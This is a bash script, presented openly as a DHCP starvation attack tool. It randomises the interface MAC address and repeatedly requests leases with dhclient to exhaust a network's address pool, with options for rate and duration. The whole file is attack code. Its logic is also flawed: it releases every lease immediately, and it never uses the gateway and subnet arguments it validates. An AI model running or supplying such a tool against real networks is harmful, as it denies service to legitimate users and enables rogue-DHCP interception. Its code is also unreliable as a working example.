#!/bin/bash

# DHCP Starvation Attack Script
# Author: Network Security Expert
# Version: 2.0
# Features: Stable MAC randomization, rate limiting, clean exit handling

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
INTERFACE=""
GATEWAY=""
SUBNET=""
VERBOSE=false
MAX_RATE=50  # Max requests per second
DURATION=0   # 0 means run indefinitely

# Check for required tools
check_dependencies() {
    local tools=("ip" "macchanger" "dhclient" "timeout")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo -e "${RED}Error: $tool is not installed${NC}"
            exit 1
        fi
    done
}

# Show help message
show_help() {
    echo -e "${YELLOW}DHCP Starvation Attack Script${NC}"
    echo -e "Usage: $0 -i <interface> -g <gateway> -s <subnet> [options]"
    echo -e "\nRequired arguments:"
    echo -e "  -i, --interface   Network interface to use"
    echo -e "  -g, --gateway     Gateway IP address"
    echo -e "  -s, --subnet      Subnet in CIDR notation (e.g., 192.168.1.0/24)"
    echo -e "\nOptions:"
    echo -e "  -r, --rate        Max requests per second (default: 50)"
    echo -e "  -d, --duration    Duration in seconds (0 for unlimited, default)"
    echo -e "  -v, --verbose     Enable verbose output"
    echo -e "  -h, --help        Show this help message"
    exit 0
}

# Validate IP address format
validate_ip() {
    local ip=$1
    if ! [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 1
    fi
    IFS='.' read -ra octets <<< "$ip"
    for octet in "${octets[@]}"; do
        if [[ $octet -lt 0 || $octet -gt 255 ]]; then
            return 1
        fi
    done
    return 0
}

# Validate subnet format
validate_subnet() {
    local subnet=$1
    if ! [[ $subnet =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then
        return 1
    fi
    IFS='/' read -r ip mask <<< "$subnet"
    validate_ip "$ip" || return 1
    if [[ $mask -lt 8 || $mask -gt 32 ]]; then
        return 1
    fi
    return 0
}

# Parse command line arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--interface)
                INTERFACE="$2"
                shift 2
                ;;
            -g|--gateway)
                GATEWAY="$2"
                shift 2
                ;;
            -s|--subnet)
                SUBNET="$2"
                shift 2
                ;;
            -r|--rate)
                MAX_RATE="$2"
                shift 2
                ;;
            -d|--duration)
                DURATION="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_help
                ;;
            *)
                echo -e "${RED}Error: Unknown option $1${NC}"
                show_help
                ;;
        esac
    done

    # Validate required arguments
    if [[ -z "$INTERFACE" || -z "$GATEWAY" || -z "$SUBNET" ]]; then
        echo -e "${RED}Error: Missing required arguments${NC}"
        show_help
    fi

    # Validate interface exists
    if ! ip link show "$INTERFACE" &>/dev/null; then
        echo -e "${RED}Error: Interface $INTERFACE does not exist${NC}"
        exit 1
    fi

    # Validate IP and subnet formats
    if ! validate_ip "$GATEWAY"; then
        echo -e "${RED}Error: Invalid gateway IP address${NC}"
        exit 1
    fi

    if ! validate_subnet "$SUBNET"; then
        echo -e "${RED}Error: Invalid subnet format. Use format like 192.168.1.0/24${NC}"
        exit 1
    fi

    # Validate rate is a positive number
    if ! [[ "$MAX_RATE" =~ ^[0-9]+$ ]] || [[ "$MAX_RATE" -le 0 ]]; then
        echo -e "${RED}Error: Rate must be a positive integer${NC}"
        exit 1
    fi

    # Validate duration is a non-negative number
    if ! [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Error: Duration must be a non-negative integer${NC}"
        exit 1
    fi
}

# Calculate sleep time based on desired rate
get_sleep_time() {
    echo "scale=3; 1/$MAX_RATE" | bc
}

# Generate random MAC address using macchanger
generate_mac() {
    macchanger -r "$INTERFACE" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | head -n 1
}

# Release current DHCP lease
release_lease() {
    dhclient -r -v "$INTERFACE" &>/dev/null
    ip addr flush dev "$INTERFACE" &>/dev/null
}

# Perform DHCP request
do_dhcp_request() {
    local mac=$1
    local timeout=2  # Timeout in seconds
    
    # Set the new MAC address
    ip link set dev "$INTERFACE" down
    ip link set dev "$INTERFACE" address "$mac"
    ip link set dev "$INTERFACE" up
    
    # Perform DHCP request with timeout
    timeout "$timeout" dhclient -v -i "$INTERFACE" &>/dev/null
    
    # Release any obtained lease immediately
    release_lease
}

# Clean up on exit
cleanup() {
    echo -e "\n${BLUE}[*] Cleaning up...${NC}"
    
    # Kill any remaining dhclient processes
    pkill -f "dhclient.*$INTERFACE" &>/dev/null
    
    # Release current lease
    release_lease
    
    # Restore original MAC address
    ip link set dev "$INTERFACE" down
    macchanger -p "$INTERFACE" &>/dev/null
    ip link set dev "$INTERFACE" up
    
    echo -e "${GREEN}[+] Cleanup complete. Exiting.${NC}"
    exit 0
}

# Main attack function
run_attack() {
    local start_time=$(date +%s)
    local request_count=0
    local sleep_time=$(get_sleep_time)
    
    echo -e "${YELLOW}[*] Starting DHCP starvation attack on $INTERFACE${NC}"
    echo -e "${YELLOW}[*] Gateway: $GATEWAY, Subnet: $SUBNET${NC}"
    echo -e "${YELLOW}[*] Rate: $MAX_RATE requests/second${NC}"
    [[ "$DURATION" -gt 0 ]] && echo -e "${YELLOW}[*] Duration: $DURATION seconds${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop the attack${NC}"
    
    trap cleanup INT TERM EXIT
    
    while true; do
        # Check duration if set
        if [[ "$DURATION" -gt 0 ]]; then
            local current_time=$(date +%s)
            local elapsed=$((current_time - start_time))
            
            if [[ "$elapsed" -ge "$DURATION" ]]; then
                echo -e "${GREEN}[+] Attack duration reached. Stopping.${NC}"
                cleanup
            fi
        fi
        
        # Generate new MAC and perform request
        local new_mac=$(generate_mac)
        
        if $VERBOSE; then
            echo -e "${BLUE}[+] Sending DHCP request with MAC: $new_mac${NC}"
        fi
        
        do_dhcp_request "$new_mac"
        ((request_count++))
        
        # Rate limiting
        sleep "$sleep_time"
    done
}

# Main execution
check_dependencies
parse_args "$@"
run_attack
